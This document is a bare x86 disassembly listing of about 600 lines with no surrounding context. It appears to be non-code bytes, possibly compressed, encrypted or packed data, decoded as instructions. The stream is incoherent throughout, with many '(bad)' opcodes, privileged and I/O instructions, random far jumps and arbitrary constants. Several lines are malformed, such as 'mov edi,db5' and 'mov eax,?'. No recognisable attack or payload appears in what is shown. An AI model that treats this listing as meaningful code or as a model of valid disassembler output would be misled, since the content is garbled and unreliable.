  415e86:	pop    edi
  415e87:	mov    dh,0x6a
  415e89:	data16 mov dh,0x3a
  415e8c:	(bad)
  415e8f:	lea    edx,[ecx+0x51]
  415e92:	pusha  
  415e93:	bound  esp,QWORD PTR [ebx-0x6d]
  415e96:	js     0x415e8a
  415e98:	lds    ecx,FWORD PTR [edi]
  415e9a:	popa   
  415e9b:	mov    al,BYTE PTR [eax+0x48803b5d]
  415ea1:	and    ecx,ebx
  415ea3:	mov    cl,0x38
  415ea5:	(bad)  
  415ea6:	retf   
  415ea7:	jmp    0xf274:0xa49516c8
  415eae:	stc    
  415eaf:	fbld   TBYTE PTR [ebx+edi*2]
  415eb2:	mov    dl,BYTE PTR [eax]
  415eb4:	add    edx,ecx
  415eb6:	leave  
  415eb7:	mov    esi,0x6c48fb70
  415ebc:	and    eax,0xc2091561
  415ec1:	push   esi
  415ec2:	pop    esp
  415ec3:	(bad)  
  415ec4:	cdq    
  415ec5:	fsubr  QWORD PTR [ecx+edx*8+0x73]
  415ec9:	jmp    0x76ad:0x72ba3cbd
  415ed0:	xchg   DWORD PTR [ebx+0x7f],ecx
  415ed3:	jns    0x415e8c
  415ed5:	addr16 iret 
  415ed7:	and    al,0x8c
  415ed9:	add    esi,DWORD PTR [ecx-0x45]
  415edc:	cdq    
  415edd:	cmp    bh,BYTE PTR [ebp-0x44]
  415ee0:	and    dl,BYTE PTR [edi]
  415ee2:	loopne 0x415f46
  415ee4:	and    al,0x4d
  415ee6:	xor    eax,0xb261c030
  415eeb:	cld    
  415eec:	sub    BYTE PTR [edx],dl
  415eee:	inc    esp
  415eef:	dec    esp
  415ef0:	fldenv [ebx]
  415ef2:	and    eax,0x8d2953c3
  415ef7:	loope  0x415e7d
  415ef9:	nop
  415efa:	gs dec edi
  415efc:	push   esi
  415efd:	std    
  415efe:	xchg   esi,eax
  415eff:	pop    edi
  415f00:	mov    ds:0x497c06e4,al
  415f05:	pusha  
  415f06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f07:	repnz aad 0x21
  415f0a:	cmp    BYTE PTR [ecx],bl
  415f0c:	and    al,0x38
  415f0e:	inc    ecx
  415f0f:	cmp    al,0x47
  415f11:	cmc    
  415f12:	sub    ecx,DWORD PTR [ebx]
  415f14:	xlat   BYTE PTR ds:[ebx]
  415f15:	xor    dl,BYTE PTR [eax]
  415f17:	out    0x40,eax
  415f19:	icebp  
  415f1a:	sahf   
  415f1b:	xchg   esp,eax
  415f1c:	test   eax,0xc1c31cd6
  415f21:	stos   BYTE PTR es:[edi],al
  415f22:	fisubr WORD PTR [esi-0x3d1c3f80]
  415f28:	mulps  xmm3,XMMWORD PTR [edx-0x60f28790]
  415f2f:	and    eax,0xc7bf7d26
  415f34:	inc    esp
  415f35:	jle    0x415eec
  415f37:	fs out dx,al
  415f39:	fimul  WORD PTR [edx+0x67039144]
  415f3f:	push   esp
  415f40:	and    al,0xfc
  415f42:	mov    edi,0x9c20ce7
  415f47:	in     eax,dx
  415f48:	and    BYTE PTR [esp+edi*8],0x1f
  415f4c:	mov    ebx,0x1142226a
  415f51:	push   edi
  415f52:	aad    0xde
  415f54:	or     eax,0xd089f01f
  415f59:	mov    eax,ds:0x84e7c44d
  415f5e:	addr16 cmp bl,ch
  415f61:	fstp   TBYTE PTR [edx-0x5b]
  415f64:	addr16 pop eax
  415f66:	sbb    eax,0x7776e958
  415f6b:	cmp    BYTE PTR [ebx],dl
  415f6d:	xor    eax,0xa76a1261
  415f72:	lahf   
  415f73:	je     0x415efe
  415f75:	loopne 0x415fe5
  415f77:	sub    al,0xf5
  415f79:	lock xor DWORD PTR [ecx],ebp
  415f7c:	add    cl,al
  415f7e:	mov    ch,0x7f
  415f80:	fnstsw WORD PTR [eax]
  415f82:	das    
  415f83:	sbb    dh,bh
  415f85:	inc    edi
  415f86:	or     al,0xcd
  415f88:	jge    0x416004
  415f8a:	fsub   QWORD PTR ds:0xfaabd56e
  415f90:	push   0xffffffac
  415f92:	add    DWORD PTR [ecx-0x2afae60e],edi
  415f98:	cmp    eax,0x30498521
  415f9d:	ja     0x415fd5
  415f9f:	xchg   edx,eax
  415fa0:	jne    0x415f44
  415fa2:	enter  0x3abd,0x94
  415fa6:	xchg   esi,eax
  415fa7:	rcr    DWORD PTR [edx-0xbbac35e],0xd7
  415fae:	ret    
  415faf:	xor    al,0x6a
  415fb1:	adc    edx,eax
  415fb3:	add    DWORD PTR [edx+0x19],ebx
  415fb6:	in     al,0x79
  415fb8:	test   DWORD PTR ss:[ebx+0x3cf88021],esi
  415fbf:	and    eax,0xb9e9ff83
  415fc4:	mov    DWORD PTR [ebx-0xe],esi
  415fc7:	int    0x90
  415fc9:	retf   0xf008
  415fcc:	sub    al,0x29
  415fce:	cmp    al,0xd3
  415fd0:	aad    0x19
  415fd2:	adc    DWORD PTR [edi-0x19],ecx
  415fd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fd6:	or     ebx,eax
  415fd8:	jmp    0xa73aa624
  415fdd:	mov    al,0xc5
  415fe0:	pop    eax
  415fe1:	cmp    eax,0xac99a96d
  415fe6:	out    0xc3,al
  415fe8:	inc    ebp
  415fe9:	mov    bl,0x9c
  415feb:	jnp    0x416054
  415fed:	call   0x53aa9a4f
  415ff2:	cmp    eax,0x9cf647c5
  415ff7:	adc    eax,0xc6e7f9e5
  415ffc:	push   ds
  415ffd:	dec    edx
  415ffe:	sbb    al,0xb5
  416000:	dec    eax
  416001:	adc    ch,dh
  416003:	and    cl,dh
  416005:	jnp    0x415f91
  416007:	fidiv  WORD PTR [bx+si+0x2b]
  41600b:	mov    ebx,0x41c8bea8
  416010:	or     bl,BYTE PTR [ecx+0x53]
  416013:	inc    esi
  416014:	push   ebp
  416015:	sti    
  416016:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416017:	pop    ebx
  416018:	pop    ebp
  416019:	mov    eax,ds:0x6eb3c3e6
  41601e:	ret    
  41601f:	adc    al,0x3c
  416021:	addr16 mov bl,0x72
  416024:	mov    al,ds:0x36c91364
  416029:	out    0xc2,eax
  41602b:	mov    ch,0x8d
  41602d:	push   0x225c9185
  416032:	adc    BYTE PTR [ebx-0x62693b98],cl
  416038:	dec    ebx
  416039:	mov    edx,ebp
  41603b:	dec    ecx
  41603c:	popf   
  41603d:	pop    ebx
  41603e:	iret   
  41603f:	hlt    
  416040:	mov    cl,0xb7
  416042:	jmp    0x306f:0x835a4faf
  416049:	cmp    al,BYTE PTR [eax-0x63ce7968]
  41604f:	mov    bl,BYTE PTR [eax-0x35]
  416052:	mov    ebp,0xb3383984
  416057:	fsub   QWORD PTR [edi-0x2cfc5145]
  41605d:	(bad)  
  41605e:	mov    ecx,0x18dd19ac
  416063:	and    eax,0x424c6afd
  416068:	pushf  
  416069:	dec    edx
  41606a:	push   edx
  41606b:	icebp  
  41606c:	cmp    BYTE PTR [esi],dl
  41606e:	fstp   DWORD PTR [esi-0x9b91c50]
  416074:	jge    0x416063
  416076:	pop    ebx
  416077:	outs   dx,BYTE PTR ds:[esi]
  416078:	xchg   edx,eax
  416079:	lods   al,BYTE PTR ds:[esi]
  41607a:	xchg   esp,eax
  41607b:	iret   
  41607c:	pop    ds
  41607d:	mov    dh,0x6e
  41607f:	mov    eax,0x98e99dfb
  416084:	imul   ebx,DWORD PTR [esi-0x392664f5],0x58
  41608b:	or     al,0x66
  41608d:	xchg   ebp,eax
  41608e:	mov    ds:0x37fbd019,eax
  416093:	shl    eax,0x76
  416096:	mov    edi,db5
  416099:	push   esp
  41609a:	adc    al,0xea
  41609c:	xor    BYTE PTR [ecx-0x73123aa2],ah
  4160a2:	xor    BYTE PTR [ebp-0x44ee1718],dl
  4160a8:	ret    0x9e9b
  4160ab:	dec    esi
  4160ac:	pop    ecx
  4160ad:	cmc    
  4160ae:	fwait
  4160af:	outs   dx,DWORD PTR ds:[esi]
  4160b0:	test   DWORD PTR [ecx+0x4a],ebx
  4160b3:	add    esp,DWORD PTR [edi+0x55]
  4160b6:	inc    edx
  4160b7:	push   edx
  4160b8:	cs xchg esp,eax
  4160ba:	das    
  4160bb:	add    DWORD PTR [ebx-0x6e],esp
  4160be:	loop   0x416092
  4160c0:	in     al,0x77
  4160c2:	xchg   DWORD PTR [ebx],ebx
  4160c4:	ins    BYTE PTR es:[edi],dx
  4160c5:	pop    ebp
  4160c6:	cmp    BYTE PTR [ecx],ah
  4160c8:	mov    al,ds:0xa8dae425
  4160cd:	std    
  4160ce:	mov    bl,0xc4
  4160d0:	jbe    0x4160a6
  4160d2:	sbb    ch,BYTE PTR [ebp+0x52]
  4160d5:	aaa    
  4160d6:	push   edi
  4160d7:	adc    ch,BYTE PTR [esi+0x6bb71f6b]
  4160dd:	fmulp  st(7),st
  4160df:	add    BYTE PTR [ebx],0x85
  4160e2:	mov    eax,0x8d4b6ff8
  4160e7:	in     al,0x5
  4160e9:	or     ecx,ecx
  4160eb:	fcomp  QWORD PTR [ebp-0x7c]
  4160ee:	mov    eax,?
  4160f0:	hlt    
  4160f1:	stc    
  4160f2:	mov    ds:0x9998ca23,al
  4160f7:	ja     0x4160a1
  4160f9:	sub    esp,ecx
  4160fb:	mov    ds:0x9982e397,eax
  416100:	and    edi,DWORD PTR ds:0xfaab95da
  416106:	inc    edi
  416107:	mov    ecx,0x40ee4d90
  41610c:	je     0x4160bc
  41610e:	mov    al,ds:0xd5cff2e8
  416113:	pop    ebx
  416114:	mov    ch,0xcf
  416116:	popa   
  416117:	jae    0x416175
  416119:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41611a:	ret    
  41611b:	cmp    DWORD PTR [edx-0x52395bde],edx
  416121:	or     al,ah
  416123:	or     ebx,edx
  416125:	xor    DWORD PTR ds:0x211f162a,ebp
  41612b:	jl     0x416124
  41612d:	mov    ch,0xcf
  41612f:	jl     0x416186
  416131:	pop    ebp
  416132:	push   ds
  416133:	fcomp  DWORD PTR [edi+0x7f]
  416136:	cmovbe ecx,DWORD PTR [edx]
  416139:	fisttp DWORD PTR [ebx-0x70f0ca4c]
  41613f:	xchg   ebx,eax
  416140:	inc    ebx
  416141:	or     eax,0xda3764a9
  416146:	push   ecx
  416147:	cmp    al,BYTE PTR [edi+0x41]
  41614a:	mov    dl,BYTE PTR ds:0xd0b36cc9
  416150:	out    dx,al
  416151:	inc    edx
  416152:	fcomp  QWORD PTR [ebx]
  416154:	mov    bh,0x49
  416156:	xor    BYTE PTR [edx-0x1842395a],ah
  41615c:	fistp  WORD PTR [ecx+0x69]
  41615f:	or     dh,ah
  416161:	pop    esp
  416162:	arpl   WORD PTR [ecx],cx
  416164:	ds aas 
  416166:	mov    eax,ds:0x5eedf6cf
  41616b:	test   eax,0x4fbeefe1
  416170:	es (bad) 
  416172:	lea    edi,[eax+0x42]
  416175:	test   DWORD PTR [ebx+edi*2-0x1a],ebp
  416179:	mov    bh,0x13
  41617b:	xchg   esi,eax
  41617c:	ret    
  41617d:	sbb    edi,DWORD PTR [edx-0x456827c7]
  416183:	mov    dl,0xed
  416185:	call   0xa993:0xe08cd956
  41618c:	mov    ?,WORD PTR gs:[eax]
  41618f:	mov    al,BYTE PTR [ebx-0x4a]
  416192:	sub    DWORD PTR [ebx-0x40],edx
  416195:	icebp  
  416196:	jmp    0x61543a0d
  41619b:	dec    edx
  41619c:	test   DWORD PTR [eax+0x44d8c9e3],edx
  4161a2:	out    0x27,al
  4161a4:	xchg   edi,eax
  4161a5:	dec    ebp
  4161a6:	out    0x14,al
  4161a8:	mov    ebx,eax
  4161aa:	mov    gs,WORD PTR [edi]
  4161ac:	scas   eax,DWORD PTR es:[edi]
  4161ad:	rol    BYTE PTR [ebp-0x77],0xf1
  4161b1:	das    
  4161b2:	in     al,dx
  4161b3:	call   0x3147:0xb0409c8c
  4161ba:	lods   eax,DWORD PTR ds:[esi]
  4161bb:	addr16 dec esi
  4161bd:	leave  
  4161be:	and    ebx,DWORD PTR [edi-0x1e34d5e4]
  4161c4:	or     al,0x71
  4161c6:	daa    
  4161c7:	jae    0x4161b3
  4161c9:	loop   0x41618f
  4161cb:	test   eax,0xea4f5ada
  4161d0:	inc    esp
  4161d1:	scas   eax,DWORD PTR es:[edi]
  4161d2:	or     edi,esi
  4161d4:	push   es
  4161d5:	inc    edx
  4161d6:	xor    bh,dl
  4161d8:	clc    
  4161d9:	adc    dh,BYTE PTR [eax+edx*4]
  4161dc:	sbb    eax,0xa9f8fb37
  4161e1:	jae    0x4161fc
  4161e3:	(bad)  
  4161e4:	cli    
  4161e5:	sahf   
  4161e6:	mov    WORD PTR [eax],es
  4161e8:	(bad)  
  4161e9:	out    0x52,al
  4161eb:	xchg   esp,eax
  4161ec:	bound  ebx,QWORD PTR [edi]
  4161ee:	cwde   
  4161ef:	cmp    esp,DWORD PTR ds:0x5cf3c46a
  4161f5:	mov    ebp,0x45c354d5
  4161fa:	sbb    al,0xb7
  4161fc:	push   ecx
  4161fd:	(bad)  
  4161ff:	fs dec esp
  416201:	mov    eax,0xca911088
  416206:	inc    ebp
  416207:	in     al,dx
  416208:	mov    ds:0x29dd73ec,eax
  41620d:	call   0x5170cc0e
  416212:	(bad)  [ebx]
  416214:	cmp    al,0x64
  416216:	and    esp,0xffffff98
  416219:	xor    dl,bl
  41621b:	lods   eax,DWORD PTR ds:[esi]
  41621c:	and    al,0x3a
  41621e:	shl    BYTE PTR [edi-0x14],1
  416221:	and    al,0x96
  416223:	fild   DWORD PTR [ecx]
  416225:	inc    eax
  416226:	daa    
  416227:	and    eax,0xdbca358c
  41622c:	inc    ebx
  41622d:	int    0xe6
  41622f:	add    edi,ebx
  416231:	icebp  
  416232:	mov    bh,0xbf
  416234:	pop    edi
  416235:	sub    edi,ebx
  416237:	xchg   ebp,eax
  416238:	sub    al,0xd8
  41623a:	outs   dx,DWORD PTR ds:[esi]
  41623b:	dec    esp
  41623c:	inc    eax
  41623d:	and    DWORD PTR [esi],ebx
  41623f:	mov    ds:0x858b71f9,eax
  416244:	jmp    0xad96078c
  416249:	mov    ds:0x67802afd,eax
  41624e:	add    BYTE PTR [ebx],dl
  416250:	jg     0x416291
  416252:	out    dx,al
  416253:	leave  
  416254:	call   0xded1:0x6197055a
  41625b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41625c:	xchg   ebx,eax
  41625d:	inc    edi
  41625e:	aaa    
  41625f:	jmp    0x684a6333
  416264:	pop    ss
  416265:	ss dec ebx
  416267:	pop    es
  416268:	mov    cl,0x4
  41626a:	enter  0x2e34,0x84
  41626e:	cmp    eax,0x98b571d8
  416273:	shr    eax,1
  416275:	mov    ds:0xe8be220a,eax
  41627a:	in     eax,0xc1
  41627c:	icebp  
  41627d:	icebp  
  41627e:	xchg   DWORD PTR cs:0xc145e6bc,ebx
  416285:	or     eax,0xde4b9ab8
  41628a:	add    al,0x72
  41628c:	lods   eax,DWORD PTR ds:[esi]
  41628d:	loope  0x416256
  41628f:	jo     0x41630d
  416291:	cli    
  416292:	cdq    
  416293:	mov    WORD PTR [esi-0x3245a2eb],es
  416299:	popf   
  41629a:	push   0x38
  41629c:	arpl   WORD PTR [edx+0x25],ax
  41629f:	ror    DWORD PTR [ecx+0x44],cl
  4162a2:	jl     0x41626f
  4162a4:	pop    ds
  4162a5:	xor    eax,DWORD PTR [ebx]
  4162a7:	out    dx,al
  4162a8:	xchg   BYTE PTR [esi+0x2068bf],dl
  4162ae:	xor    cl,BYTE PTR [edx+0x245bcfc3]
  4162b4:	jl     0x41626d
  4162b6:	(bad)  
  4162b7:	dec    edx
  4162b8:	test   eax,0xd4497ad9
  4162bd:	stos   DWORD PTR es:[edi],eax
  4162be:	dec    esp
  4162bf:	out    dx,al
  4162c0:	pop    esi
  4162c1:	lods   eax,DWORD PTR ds:[esi]
  4162c2:	and    dl,BYTE PTR [ecx-0x3cb6e8b8]
  4162c8:	jmp    0x4bbd16a3
  4162cd:	mov    ebx,DWORD PTR [edi]
  4162cf:	or     dh,BYTE PTR [edi+0x49]
  4162d2:	sbb    bl,BYTE PTR [edx-0x39d0008a]
  4162d8:	sub    esi,DWORD PTR [edi]
  4162da:	and    edi,ecx
  4162dc:	or     al,0xdb
  4162de:	xlat   BYTE PTR ds:[ebx]
  4162df:	jno    0x416289
  4162e1:	mov    esp,esi
  4162e3:	push   edx
  4162e4:	xchg   dl,cl
  4162e6:	xlat   BYTE PTR ds:[ebx]
  4162e7:	retf   0x756c
  4162ea:	stos   DWORD PTR es:[edi],eax
  4162eb:	(bad)
  4162ee:	cmp    eax,0x2b63a897
  4162f3:	shl    DWORD PTR [edi-0x65],1
  4162f6:	add    bl,al
  4162f8:	pushf  
  4162f9:	jg     0x4162be
  4162fb:	mov    eax,ds:0xd9e1b70
  416300:	mov    bh,0x44
  416302:	sahf   
  416303:	add    eax,0x71b59279
  416308:	dec    edi
  416309:	cmp    DWORD PTR [ebp-0x3ab3e0],esp
  41630f:	outs   dx,BYTE PTR ds:[esi]
  416310:	retf   0xc48
  416313:	ret    
  416314:	enter  0xd43,0xd3
  416318:	lods   al,BYTE PTR ds:[esi]
  416319:	and    al,0x59
  41631b:	adc    eax,0xd85483a5
  416320:	mul    ch
  416322:	jg     0x4162d9
  416324:	retw   0x60de
  416328:	das    
  416329:	cmp    DWORD PTR [ebx+0x4401700f],0x7550f46f
  416333:	call   ebx
  416335:	ror    BYTE PTR [ebx],1
  416337:	sbb    dh,BYTE PTR [ecx+0x48]
  41633a:	jp     0x4163a8
  41633c:	sub    eax,0x1c71e793
  416341:	mov    cl,0xe1
  416343:	std    
  416344:	mov    ecx,0x252e410f
  416349:	enter  0x511f,0xd0
  41634d:	retf   
  41634e:	jmp    0xe6d17f70
  416353:	loopne 0x41630a
  416355:	rcr    BYTE PTR [edx],0x4a
  416358:	idiv   BYTE PTR [eax-0x5d3e91e8]
  41635e:	sub    BYTE PTR [eax+esi*1-0x7e],0x74
  416363:	jnp    0x41636a
  416365:	retf   0xe9ae
  416368:	jo     0x4163c9
  41636a:	or     ebx,DWORD PTR [esi+0x42]
  41636d:	or     esp,DWORD PTR [ecx]
  41636f:	cs iret 
  416371:	(bad)  [esp+eiz*2]
  416374:	dec    esp
  416375:	mov    bh,0xfa
  416377:	sbb    bl,BYTE PTR [ebx-0x3b]
  41637a:	jb     0x416384
  41637c:	and    DWORD PTR [eax-0x2a8b3afd],edx
  416382:	or     al,0x19
  416384:	in     al,dx
  416385:	call   0x341168e
  41638a:	jno    0x4163f8
  41638c:	xor    DWORD PTR [esi],eax
  41638e:	fwait
  41638f:	jecxz  0x41637c
  416391:	cmp    al,0xa9
  416393:	retf   
  416394:	je     0x416407
  416396:	mov    cs,WORD PTR [eax]
  416398:	aad    0x9a
  41639a:	out    0x2,eax
  41639c:	mov    esp,0x4a186f32
  4163a1:	int3   
  4163a2:	adc    eax,0x7852c8a
  4163a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163a8:	stc    
  4163a9:	fs push es
  4163ab:	lods   eax,DWORD PTR ds:[esi]
  4163ac:	(bad)  
  4163ad:	xchg   edx,eax
  4163ae:	xor    al,0x5a
  4163b0:	ins    DWORD PTR es:[edi],dx
  4163b1:	and    esi,DWORD PTR [edx-0x3c]
  4163b4:	and    BYTE PTR [ebx-0x7f],ch
  4163b7:	test   BYTE PTR [esi+ebp*1],al
  4163ba:	dec    esp
  4163bb:	mul    BYTE PTR [esp+ecx*1+0x1e595ca5]
  4163c2:	fild   DWORD PTR [ecx]
  4163c5:	jg     0x41634a
  4163c7:	and    ebp,edx
  4163c9:	ret    0xe272
  4163cc:	jl     0x4163a7
  4163ce:	fsub   st,st(2)
  4163d0:	nop
  4163d1:	test   eax,0x3c2b1f3d
  4163d6:	test   al,0x9c
  4163d8:	mov    ah,0xff
  4163da:	xchg   ecx,eax
  4163db:	push   edx
  4163dc:	out    dx,eax
  4163dd:	add    DWORD PTR [eax+eiz*2+0x9188e72],edi
  4163e4:	adc    al,0xee
  4163e6:	mov    esi,0x8c71c8b0
  4163eb:	sub    ah,ah
  4163ed:	int3   
  4163ee:	jo     0x416419
  4163f0:	push   es
  4163f1:	jns    0x41644d
  4163f3:	pusha  
  4163f4:	(bad)  
  4163f5:	mov    WORD PTR [ebx+0x59733896],ss
  4163fb:	jbe    0x41640a
  4163fd:	inc    ebp
  4163fe:	xor    eax,0x4ce974fd
  416403:	xor    ecx,ebx
  416405:	retf   
  416406:	cmp    ah,BYTE PTR [esp+ebx*4+0xa0774b5]
  41640d:	int    0x5
  41640f:	xchg   edx,eax
  416410:	xor    BYTE PTR [ebp+0x57],0xb1
  416414:	scas   al,BYTE PTR es:[edi]
  416415:	and    al,0xde
  416417:	outs   dx,BYTE PTR ds:[esi]
  416418:	and    BYTE PTR [ecx+0x724d7ed2],bh
  41641e:	pop    eax
  41641f:	jge    0x4163d0
  416421:	jno    0x416441
  416423:	inc    ebx
  416424:	push   edx
  416425:	add    al,0x1b
  416427:	(bad)  
  416429:	dec    esp
  41642a:	xchg   ecx,eax
  41642b:	cs aam 0xbf
  41642e:	int    0x34
  416430:	adc    bh,BYTE PTR [ebx-0x2367fa67]
  416436:	xor    bh,BYTE PTR [esi+0x57693a6c]
  41643c:	cs (bad) 
  41643e:	cmp    BYTE PTR [eax],cl
  416440:	jbe    0x41642f
  416442:	mov    ch,0x34
  416444:	lock xchg ebx,eax
  416446:	mov    dh,0x1c
  416448:	pop    ebx
  416449:	inc    eax
  41644a:	dec    edx
  41644b:	outs   dx,BYTE PTR ds:[esi]
  41644c:	fdiv   QWORD PTR [eax-0x24]
  41644f:	bound  ebx,QWORD PTR [esi+ecx*4-0x6db116c9]
  416456:	fcmovne st,st(1)
  416458:	lahf   
  416459:	test   eax,0x507c89c6
  41645e:	jmp    0xc8de3072
  416463:	pop    esi
  416464:	cwde   
  416465:	push   0x189185cb
  41646a:	cs jge 0x4163f4
  41646d:	imul   edi,ebx,0xb
  416470:	mov    eax,ds:0x5e41f77c
  416475:	cmp    BYTE PTR [ecx+ebp*4-0x66],0x44
  41647a:	out    dx,eax
  41647b:	arpl   WORD PTR [ecx-0x40],ax
  41647e:	sti    
  41647f:	scas   eax,DWORD PTR es:[edi]
  416480:	sahf   
  416481:	mov    BYTE PTR [esi],0xb1
  416484:	dec    esp
  416485:	ret    
  416486:	xor    dl,BYTE PTR [esi+0x7]
  416489:	ja     0x416437
  41648b:	mov    eax,ds:0x7efa6552
  416490:	dec    esp
  416491:	jg     0x416498
  416493:	xor    eax,eax
  416495:	cmp    BYTE PTR [ebx+0x23],al
  416498:	mov    WORD PTR [ebp-0x13],fs
  41649b:	call   0x7c895246
  4164a0:	fstp   DWORD PTR [edx]
  4164a2:	add    eax,DWORD PTR [edi-0x65a152fe]
  4164a8:	cmp    dl,dh
  4164aa:	cli    
  4164ab:	test   al,0xf4
  4164ad:	loopne 0x416451
  4164af:	sti    
  4164b0:	sbb    cl,BYTE PTR [ecx]
  4164b2:	in     al,dx
  4164b3:	adc    DWORD PTR [edi-0x35f21973],ebp
  4164b9:	push   eax
  4164ba:	out    0x94,al
  4164bc:	rcr    DWORD PTR ds:0x5a77ab2d,1
  4164c2:	add    al,dh
  4164c4:	fidiv  DWORD PTR [ecx+0x31]
  4164c7:	lods   eax,DWORD PTR ds:[esi]
  4164c8:	push   edi
  4164c9:	push   cs
  4164ca:	pop    ebx
  4164cb:	or     BYTE PTR [edx+0xd],ch
  4164ce:	imul   ebp,DWORD PTR [edi+0x21],0xbb7e921e
  4164d5:	aas    
  4164d6:	push   ecx
  4164d7:	and    DWORD PTR [eax-0x28],0xd87a61a2
  4164de:	jl     0x41651a
  4164e0:	arpl   WORD PTR [esp+ebp*1-0x7e9eb494],bx
  4164e7:	dec    ecx
  4164e8:	push   ss
  4164e9:	inc    edx
  4164ea:	cmp    eax,0x8255b36c
  4164ef:	cmp    esp,esp
  4164f1:	inc    ebp
  4164f2:	add    ecx,DWORD PTR [ebx-0x3b]
  4164f5:	or     BYTE PTR [ebx],0xcc
  4164f8:	mov    DWORD PTR [edx+0x6f0d4285],0xde41e6e9
  416502:	jno    0x41652f
  416504:	in     eax,0xa1
  416506:	fsubr  DWORD PTR [ecx+0x20b5bf98]
  41650c:	mov    esi,0x6b0bb813
  416511:	sbb    DWORD PTR [ebx-0x7d],edi
  416514:	sbb    bh,BYTE PTR [ebx-0x7637b299]
  41651a:	push   eax
  41651b:	jb     0x416580
  41651d:	mov    ebx,DWORD PTR [esi]
  41651f:	dec    edx
  416520:	nop
  416521:	dec    edi
  416522:	scas   eax,DWORD PTR es:[edi]
  416523:	push   eax
  416524:	and    esi,DWORD PTR [edi]
  416526:	(bad)  
  416527:	cdq    
  416528:	stos   DWORD PTR es:[edi],eax
  416529:	ja     0x4164f0
  41652b:	mov    bh,BYTE PTR [edx+0x60]
  41652e:	ja     0x4164e4
  416530:	cmp    al,0xd8
  416532:	lds    esi,FWORD PTR [esi+0x4b29e6f7]
  416538:	sub    BYTE PTR [ebp-0x5b],cl
  41653b:	inc    ebx
  41653c:	or     eax,DWORD PTR [edi-0x4d97158a]
  416542:	clc    
  416543:	out    dx,al
  416544:	in     eax,0xa5
  416546:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416547:	hlt    
  416548:	aad    0x2a
  41654a:	addr16 jmp 0xa4fd:0x1cd69ca
  416552:	push   esi
  416553:	mov    dl,ah
  416555:	inc    esi
  416556:	mov    ds:0x12f8fd21,eax
  41655b:	ja     0x4165ae
  41655d:	adc    BYTE PTR [ecx-0x29],ch
  416560:	cmp    ebp,eax
  416562:	xlat   BYTE PTR ds:[ebx]
  416563:	dec    edx
  416564:	mov    ebp,0xe0958d7c
  416569:	test   al,0xac
  41656b:	fwait
  41656c:	jg     0x41651b
  41656e:	mov    ah,0x61
  416571:	pop    eax
  416572:	add    al,0x1a
  416574:	pop    ss
  416575:	jae    0x416557
  416577:	add    eax,0xefee3f85
  41657c:	inc    esp
  41657d:	add    esp,DWORD PTR [ecx+0x477e52a8]
  416583:	sub    DWORD PTR [ebx+eiz*2-0x256d170],esp
  41658a:	jmp    0x4165e5
  41658c:	(bad)  
  41658d:	dec    ebx
  41658e:	mov    ds:0xa540dbac,al
  416593:	push   ecx
  416594:	bound  ebp,QWORD PTR [ebp-0x66e4b394]
  41659a:	inc    esi
  41659b:	push   eax
  41659c:	inc    edx
  41659d:	pop    ss
  41659e:	leave  
  41659f:	outs   dx,DWORD PTR ds:[esi]
  4165a0:	test   eax,0xbcc44e50
  4165a5:	mov    bl,0x1a
  4165a7:	test   eax,0xa42dc38c
  4165ac:	cmc    
  4165ad:	(bad)  
  4165ae:	in     al,dx
  4165af:	cmc    
  4165b0:	jbe    0x4165b1
  4165b2:	loope  0x416541
  4165b4:	popa   
  4165b5:	xor    edx,DWORD PTR [ebx+0x40]
  4165b8:	rcr    BYTE PTR [eax],cl
  4165ba:	push   edx
  4165bb:	sbb    cl,BYTE PTR [eax-0x2f]
  4165be:	sbb    BYTE PTR [eax+0x76],bl
  4165c1:	pop    eax
  4165c2:	data16 adc bh,BYTE PTR [esi]
  4165c5:	stc    
  4165c6:	xor    cl,ah
  4165c8:	mov    ch,0x52
  4165ca:	add    ch,BYTE PTR [ecx+0x6a3edb4c]
  4165d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165d1:	xor    eax,0xc2f90de5
  4165d6:	lock dec edx
  4165d8:	icebp  
  4165d9:	push   ebx
  4165da:	cmp    BYTE PTR [ecx-0x44],ch
  4165dd:	push   0x742262e1
  4165e2:	icebp  
  4165e3:	xchg   edx,eax
  4165e4:	or     BYTE PTR ds:0x7731b75,al
  4165ea:	hlt    
  4165eb:	call   0xe1b41737
  4165f0:	jg     0x4165d4
  4165f2:	mov    al,ds:0x3e6f00b9
  4165f7:	fsubr  QWORD PTR [ecx-0x53b6ba1a]
  4165fd:	popf   
  4165fe:	jecxz  0x41658c
  416600:	nop
  416601:	aaa    
  416602:	jae    0x41667e
  416604:	xor    esi,ebp
  416606:	pop    ecx
  416607:	adc    al,0x6c
  416609:	pop    edi
  41660a:	xor    DWORD PTR [ecx+0x281bb372],0x43d68b49
  416614:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416615:	mov    ch,0x6
  416617:	push   ss
  416618:	cmp    bh,BYTE PTR [edi+0x1f231b1e]
  41661e:	mov    ds:0x7e458aed,al
  416623:	das    
  416624:	or     eax,0xaa009eb3
  416629:	dec    eax
  41662a:	and    al,0xce
  41662c:	adc    BYTE PTR [ecx],bh
  41662e:	pusha  
  41662f:	sti    
  416630:	cmp    eax,0xbfeebd05
  416635:	sbb    eax,0xa7012032
  41663a:	adc    al,0x9e
  41663c:	lock test DWORD PTR gs:[edi-0x1340611],esi
  416644:	or     eax,0x634ef654
  416649:	mov    edx,0xd49b4e09
  41664e:	in     al,0x2d
  416650:	pop    edx
  416651:	mov    bh,0x7
  416653:	iret   
  416654:	ss jmp 0x1776915d
  41665a:	loop   0x41669f
  41665c:	ins    DWORD PTR es:[edi],dx
  41665d:	shl    ebp,1
  41665f:	cwde   
  416660:	push   edx
  416661:	sbb    esp,DWORD PTR [esi-0x1]
  416664:	ds js  0x416616
  416667:	gs scas al,BYTE PTR es:[edi]
  416669:	comiss xmm0,DWORD PTR [ecx+ecx*2-0x2691de71]
  416671:	mov    ds:0xa84d33b2,al
  416676:	jge    0x416649
  416678:	xchg   BYTE PTR [edi],bl
  41667a:	xlat   BYTE PTR ds:[ebx]
  41667b:	xchg   ebp,eax
  41667c:	xchg   edi,eax
  41667d:	xlat   BYTE PTR ds:[ebx]
  41667e:	stos   BYTE PTR es:[edi],al
  41667f:	xchg   ebp,eax
